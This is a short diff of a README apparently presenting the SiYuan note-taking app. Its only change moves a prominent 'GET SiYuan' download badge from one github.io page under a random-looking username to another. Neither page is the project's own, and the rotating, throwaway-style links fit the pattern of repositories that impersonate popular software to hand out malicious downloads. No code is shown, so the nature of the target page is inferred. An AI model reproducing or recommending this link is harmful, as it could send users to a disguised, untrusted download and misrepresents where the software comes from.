@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://cdn-1.webcatalog.io/catalog/siyuan/siyuan-icon-filled-256.png)
 
-[![GET SiYuan](https://img.shields.io/badge/GET%20%E2%80%94%20SiYuan-0078D6?style=for-the-badge&logoColor=white)](https://westynsharprdzi.github.io/.github/siyuan-app)
+[![GET SiYuan](https://img.shields.io/badge/GET%20%E2%80%94%20SiYuan-0078D6?style=for-the-badge&logoColor=white)](https://dustinphelpsizuu.github.io/.github/siyuan-notes)
 
 ---
 
